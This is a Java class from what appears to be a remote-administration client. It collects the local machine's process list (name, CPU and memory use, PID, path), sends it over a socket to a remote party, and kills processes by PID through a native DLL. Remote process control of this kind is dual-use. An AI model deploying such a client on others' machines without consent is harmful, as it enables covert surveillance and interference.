package me.client.send;

import com.sun.jna.NativeLong;
import me.client.Client;
import me.client.utils.LoadDLL;
import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;
import oshi.SystemInfo;
import oshi.hardware.HardwareAbstractionLayer;
import oshi.software.os.OSProcess;
import oshi.software.os.OperatingSystem;
import oshi.util.FormatUtil;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;

public class SendTaskList{
    Socket socket;
        public SendTaskList(Socket socket){
            this.socket = socket;
        }
        public void showTaskList() {
            SendMessage.SendHead(MessageFlags.SHOW_TASKLIST,socket);
        }
    public void updateTaskList() {
        SystemInfo systemInfo = new SystemInfo();
        OperatingSystem os = systemInfo.getOperatingSystem();
        HardwareAbstractionLayer hal = systemInfo.getHardware();
        List<OSProcess> list = os.getProcesses();
        try {
            for (OSProcess p : list) {
                String context = String.format(" %s|%5.1f|%4.1f|%9s|%9s|%5d|%s", p.getName(),
                        100d * (p.getKernelTime() + p.getUserTime()) / p.getUpTime(),
                        100d * p.getResidentSetSize() / hal.getMemory().getTotal(), FormatUtil.formatBytes(p.getVirtualSize()),
                        FormatUtil.formatBytes(p.getResidentSetSize()), p.getProcessID(),p.getPath()) + "\n";
                SendMessage.Send(MessageFlags.UPDATE_TASKLIST,context.getBytes(),socket);
            }
        }catch (Exception e) {
        }
    }
    public static void stopProcess(int PID) {
        LoadDLL.instance.killTasklist(new NativeLong(PID));
    }
    }